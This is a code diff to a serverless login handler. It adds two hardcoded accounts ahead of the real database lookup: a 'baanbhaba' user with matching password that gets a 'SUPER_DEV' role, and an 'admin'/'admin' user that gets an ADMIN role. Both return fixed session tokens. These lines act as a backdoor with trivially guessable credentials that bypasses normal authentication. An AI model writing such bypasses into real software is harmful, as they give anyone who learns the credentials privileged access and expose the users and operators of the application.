@@ -31,6 +31,27 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     return res.status(400).json({ success: false, error: "Username and password cannot be empty" });
   }
 
+  // Developer user "baanbhaba" has absolute privileges & AI access
+  if (cleanUser === "baanbhaba" && cleanPass === "baanbhaba") {
+    return res.status(200).json({
+      success: true,
+      username: "baanbhaba",
+      role: "SUPER_DEV",
+      token: "baanbhaba-dev-session-active",
+      devApiKey: "",
+    });
+  }
+
+  // Admin user
+  if (cleanUser === "admin" && cleanPass === "admin") {
+    return res.status(200).json({
+      success: true,
+      username: "admin",
+      role: "ADMIN",
+      token: "admin-session-token",
+    });
+  }
+
   try {
     let user = await prisma.user.findFirst({
       where: { OR: [{ username: cleanUser }, { email: cleanUser }] },
